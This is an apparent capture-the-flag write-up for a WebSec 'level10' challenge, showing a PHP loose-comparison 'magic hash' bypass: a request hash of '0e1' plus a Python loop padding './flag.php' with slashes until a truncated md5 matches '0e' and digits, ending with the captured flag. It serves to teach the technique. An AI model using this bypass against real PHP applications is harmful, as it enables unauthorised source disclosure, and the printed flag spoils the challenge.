---
layout: default
title: level10
---

Here we exploit the loose comparison, and the fact it takes only the first 8 digits from the hash
```php
    $hash = substr (md5 ($flag . $file . $flag), 0, 8);
    if ($request == $hash) {
        show_source ($file);
    }
``` 

Also, if we will give `./flag.php` and `.///////flag.php`, it'll be treated the same.


What i want to do is to give `0e1` as the hash, and trying to give some `.///////flag.php` (with more slashes) that'll give us hash which looks like: `0edddddddd` (d -> digit).

This will work because we use loose comparison, and it being treated as exponent number, which then treated as `0`. source from here [php operators comparison](https://www.php.net/manual/en/language.operators.comparison.php).
```bash
php > echo "0e1" == "0";
> 1
php > echo "0e1" == "0e8472638";
> 1
```

I've tried this simple script, to check on dummy flag whether it'll work, and it worked!
```python
import hashlib
import string
import itertools
import re

flag = "WEBSEC{{flagflagflag}}"  # we don't know the flag, so just guess one temporarily

def is_magic_hash(s):
    return re.match(r"0e\d+$", s)

counter = 1
while True:
        f = '.' + '/'*counter + 'flag.php'
        h = hashlib.md5((flag + f + flag).encode()).hexdigest()
        # Check if the hash is in the format of "0e" followed by digits
        print(f"Trying f={f}, md5={h}, counter={counter}")
        if is_magic_hash(h[0:8]):
            print(f"Try f={f}, md5={h}, counter={counter}")
            exit()
        counter += 1
```
Output:
> `////(...)//flag.php, md5=0e425116ebcb7ea06f57e56d74a0c33c, counter=10391`

Know, let's rewrite the script to attack:

Here we don't know the flag, and just send each time with more `/` the filename, until we manage to bypass the *if statement*.

```py
{% include_relative scripts/level10.py %}
```

**Flag:** ***`WEBSEC{Lose_typ1ng_system_are_super_great_aren't_them?}`*** 
